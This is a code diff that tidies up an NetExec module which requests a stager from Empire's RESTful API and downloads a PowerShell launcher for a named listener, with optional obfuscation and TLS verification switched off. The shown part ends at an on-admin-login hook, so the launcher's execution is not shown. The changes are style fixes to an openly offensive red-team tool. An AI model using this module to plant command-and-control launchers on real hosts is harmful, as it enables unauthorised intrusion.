@@ -1,14 +1,6 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import sys
 import requests
 from requests import ConnectionError
-
-# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
 class NXCModule:
@@ -38,7 +30,7 @@ class NXCModule:
 
         api_proto = "https" if "SSL" in module_options else "http"
 
-        obfuscate = True if "OBFUSCATE" in module_options else False
+        obfuscate = "OBFUSCATE" in module_options
         # we can use commands instead of backslashes - this is because Linux and OSX treat them differently
         default_obfuscation = "Token,All,1"
         obfuscate_cmd = module_options["OBFUSCATE_CMD"] if "OBFUSCATE_CMD" in module_options else default_obfuscation
@@ -100,7 +92,7 @@ class NXCModule:
                 verify=False,
             )
         except ConnectionError:
-            context.log.fail(f"Unable to request stager from Empire's RESTful API")
+            context.log.fail("Unable to request stager from Empire's RESTful API")
             sys.exit(1)
 
         if stager_response.status_code not in [200, 201]:
@@ -111,7 +103,6 @@ class NXCModule:
             sys.exit(1)
 
         context.log.debug(f"Response Code: {stager_response.status_code}")
-        # context.log.debug(f"Response Content: {stager_response.text}")
 
         stager_create_data = stager_response.json()
         context.log.debug(f"Stager data: {stager_create_data}")
@@ -123,14 +114,13 @@ class NXCModule:
             verify=False,
         )
         context.log.debug(f"Response Code: {download_response.status_code}")
-        # context.log.debug(f"Response Content: {download_response.text}")
 
         self.empire_launcher = download_response.text
 
         if download_response.status_code == 200:
             context.log.success(f"Successfully generated launcher for listener '{module_options['LISTENER']}'")
         else:
-            context.log.fail(f"Something went wrong when retrieving stager Powershell command")
+            context.log.fail("Something went wrong when retrieving stager Powershell command")
 
     def on_admin_login(self, context, connection):
         if self.empire_launcher:
